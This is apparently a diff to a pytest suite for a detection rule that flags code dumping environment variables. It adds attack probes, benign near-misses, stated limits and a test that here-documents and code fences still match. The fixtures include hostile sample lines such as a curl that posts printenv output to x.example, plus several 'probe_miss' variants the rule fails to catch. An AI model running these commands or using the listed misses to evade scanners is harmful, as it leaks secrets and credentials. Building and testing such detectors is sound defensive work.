@@ -79,6 +79,15 @@ ATTACKS = {
     'sh_command_builtin': 'command printenv > /tmp/e.txt\n',
     'sh_abs_path': '/usr/bin/printenv > /tmp/e.txt\n',
     'sh_curl_dq': 'curl -s -d "x=$(printenv)" https://x.example/in\n',
+    'probe_r1_unpack_pair': 'for k,v in os.environ.items():\n print(*(k,v))\n',
+    'probe_miss_py_parenthesized_value': 'for k,v in os.environ.items():\n print(k, (v))\n',
+    'probe_miss_py_flush_token': 'for k,v in os.environ.items():\n print(k,v,flush=True)\n',
+    'probe_miss_py_tuple_wrapped_mapping': 'print((os.environ))\n',
+    'probe_miss_shell_option_null': 'printenv -0 > /tmp/e.txt\n',
+    'probe_miss_node_optional_call': 'console.log?.(process.env);\n',
+    'probe_miss_node_var_prefix': 'void console.log(process.env);\n',
+    'probe_miss_node_loop_var_prefix': 'for (const [k,v] of Object.entries(process.env)) void console.log(k,v);\n',
+    'probe_miss_shell_builtin_prefix': 'builtin export -p > /tmp/e.txt\n',
 }
 
 BENIGN = {
@@ -148,6 +157,46 @@ BENIGN = {
     'sh_encoder_help': 'printenv | base64 --help\n',
     'sh_curl_single_quoted': "curl -s -d '$(printenv)' https://x.example/in\n",
     'sh_comment_sep_curl': 'echo ok # then; curl -d "$(printenv)" https://x.example\n',
+    'probe_r1_http_documentation_inline': '"requests.post(u, data=dict(os.environ))"\n',
+    'probe_r1_node_filtered_loop': "for (const [k,v] of Object.entries(process.env)) {\n if(k.startsWith('APP_')) console.log(k,v);\n}\n",
+    'probe_r1_node_keys_entries': 'for (const [k,v] of Object.entries(process.env)) console.log(k);\n',
+    'probe_r1_node_loop_fixed_setting': 'for (const [k,v] of Object.entries(process.env)) console.log(process.env.PORT);\n',
+    'probe_r1_py_loop_fixed_setting': "for k,v in os.environ.items():\n print(os.environ['HOME'])\n",
+    'probe_r2_py_log_fixed_setting_label': "for k, value in os.environ.items():\n logging.info('value', os.environ['HOME'])\n",
+    'probe_r2_assert_prefix': "assert repr(os.environ).startswith('environ')\n",
+    'probe_new_py_value_comparison': 'for k,v in os.environ.items():\n print(k, v == "")\n',
+    'probe_new_py_value_truth_test': 'for k,v in os.environ.items():\n print(k, not v)\n',
+    'probe_new_py_spaced_slice': 'for k,v in os.environ.items():\n print(k, v [:0])\n',
+    'probe_new_py_fstring_empty_precision': 'for k,v in os.environ.items():\n print(f"{k}={v:.0}")\n',
+    'probe_new_py_logging_presence': 'for k,v in os.environ.items():\n logging.info("set: %s", v != "")\n',
+    'probe_new_py_names_default_list': 'print(json.dumps(os.environ, default=list))\n',
+    'probe_new_py_mock_log_assertion': 'from unittest.mock import Mock\nlogger = Mock()\nlogger(os.environ)\nlogger.assert_called_with(os.environ)\n',
+    'probe_new_py_nested_http_filter': 'requests.post(url, data=allowlisted_settings(data=os.environ))\n',
+    'probe_new_py_http_test_helper': 'client.post.assert_called_with(url, data=os.environ)\n',
+    'probe_new_node_bracket_assert': "console['assert'](process.env, 'env missing');\n",
+    'probe_new_node_counter': 'console.count(process.env);\n',
+    'probe_new_node_entries_presence': "for (const [k,v] of Object.entries(process.env)) console.log(k, v === '');\n",
+    'probe_new_node_entries_ternary': "for (const [k,v] of Object.entries(process.env)) console.log(k, v ? 'set' : 'unset');\n",
+    'probe_new_node_entries_transformed_key': 'for (const [k,v] of Object.entries(process.env)) console.log(k.toUpperCase());\n',
+    'probe_new_node_entries_bracket_assert': "for (const [k,v] of Object.entries(process.env)) console['assert'](v, k);\n",
+    'probe_new_shell_long_null_spacing': 'printenv >                                         /dev/null\n',
+    'probe_new_shell_pipe_overridden_stdin': 'printenv | base64 < /dev/null\n',
+    'probe_new_shell_env_overridden_stdin': 'env | base64 < /dev/null\n',
+    'probe_new_shell_env_late_help': 'env | curl -s --version\n',
+    'probe_new_shell_filter_before_encoder': 'env | grep ^APP_ | base64\n',
+    'probe_new_shell_escaped_substitution': 'curl -d "\\$(printenv)" https://example.test\n',
+    'probe_new_shell_quoted_separator': "printf '%s\\n' 'example; env | base64'\n",
+    'probe_new_ci_names_pipeline': 'steps:\n  - run: |\n      env | cut -d= -f1 | sort\n',
+    'probe_new_node_nested_http_filter': 'fetch(url, {body: redact({data: process.env})});\n',
+    'probe_new_node_forin_equality': "for (const k in process.env) console.log(k, process.env[k] === '');\n",
+    'probe_new_node_forin_ternary': "for (const k in process.env) console.log(k, process.env[k] ? 'set' : 'unset');\n",
+    'probe_new_node_forin_transformed_key': 'for (const k in process.env) console.log(k.toUpperCase());\n',
+    'probe_new_py_key_format_keyword': 'for k,v in os.environ.items():\n print("{v}".format(v=k.upper()))\n',
+    'probe_new_py_filter_inside_call': 'for k,v in os.environ.items():\n print(k, v if k.startswith("PUBLIC_") else "[redacted]")\n',
+    'probe_new_node_key_object_property': 'for (const [k,v] of Object.entries(process.env)) console.log({v: k.toUpperCase()});\n',
+    'probe_new_node_forin_bracket_assert': "for (const k in process.env) console['assert'](process.env[k], k);\n",
+    'probe_new_node_nullish_presence': 'for (const [k,v] of Object.entries(process.env)) console.log(k, !!v);\n',
+    'probe_new_py_stdout_to_null': 'with open("/dev/null", "w") as sink:\n print(os.environ, file=sink)\n',
 }
 
 
@@ -217,9 +266,29 @@ NOT_FLAGGED_ON_PURPOSE = {
     'py_value_upper': 'import os\nfor k, v in os.environ.items():\n    print(k, v.upper())\n',
     'py_value_json_dumps': 'import os, json\nfor k, v in os.environ.items():\n    print(k, json.dumps(v))\n',
     'node_assign_then_log': 'const s = JSON.stringify(process.env);\nconsole.log(s);\n',
+    # The value must reach the output as it is: any slice, default, conditional or call on it takes the line out of the rule.
+    'py_value_or_default': "import os\nfor k, v in os.environ.items():\n    print(k, v or '-')\n",
+    'py_value_in_conditional': "import os\nfor k, v in os.environ.items():\n    print(k, v if k else '')\n",
+    'py_value_sliced': 'import os\nfor k, v in os.environ.items():\n    print(k, v[:99])\n',
 }
 
 
 @pytest.mark.parametrize("name", sorted(NOT_FLAGGED_ON_PURPOSE))
 def test_stated_limits_are_not_flagged(engine, name):
     assert RULE not in _ids(engine, NOT_FLAGGED_ON_PURPOSE[name]), name
+
+# The rule reads lines, not syntax: a statement-shaped line inside text that is not code (a docstring, a block comment,
+# a README code fence, a shell here-document) is read as the statement it shows. Pinned so the disclosure stays true.
+STATEMENT_SHAPED_TEXT_STILL_MATCHES = {
+    'probe_py_docstring': 'def example():\n """Example:\n print(os.environ)\n """\n',
+    'probe_readme_fence': '```python\nprint(os.environ)\n```\n',
+    'probe_new_shell_here_doc': "cat <<'EOF'\nprintenv > /tmp/example.txt\nEOF\n",
+    'probe_new_shell_here_doc_pipe': "cat <<'EOF'\nenv | base64\nEOF\n",
+    'probe_new_ci_here_doc': "steps:\n  - run: |\n      cat <<'EOF'\n      env | base64\n      EOF\n",
+    'probe_block_comment_console': '/*\nconsole.log(process.env);\n*/\n',
+}
+
+
+@pytest.mark.parametrize("name", sorted(STATEMENT_SHAPED_TEXT_STILL_MATCHES))
+def test_statement_shaped_text_is_read_as_the_statement(engine, name):
+    assert RULE in _ids(engine, STATEMENT_SHAPED_TEXT_STILL_MATCHES[name]), name
